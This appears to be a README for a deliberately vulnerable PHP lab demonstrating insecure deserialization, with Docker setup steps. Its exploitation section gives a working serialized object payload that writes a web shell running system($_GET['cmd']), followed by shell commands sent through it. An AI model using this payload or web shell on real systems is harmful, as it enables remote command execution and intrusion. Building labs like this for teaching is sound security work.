# Insecure Deserialization
tl;dr

User locally serializes some data and passes it to our app which uploads a shell.

## Files 

```
file.php
```
Blindly accepts anything and runs unserialize()

```
serialize.php
```
Generates a serialized exploit

## Installing

Git checkout this repo

```
cd into this repo
```

```
docker build -t insecure_deserialize:latest .
```

## Running

```
docker run -d insecure_deserialize:latest -p 33322:80
```

## Exploting

* First we serialize our payload with serialize.php
```
php serialize.php
```

* We then copy our payload and run it against our vulnerable site
* * If the payload executes the screen will return white
```
http://localhost:33322/file.php?u=O:4:"File":2:{s:8:"filename";s:16:"simple_shell.php";s:7:"content";s:35:"<?php echo system($_GET['cmd']); ?>";}
```

* We now have a simple cmd shell on our host and can execute away

```
http://localhost:33322/simple_shell.php?cmd=whoami
```
```
http://localhost:33322/simple_shell.php?cmd=ls -la
```

## Thanks

[1]https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf
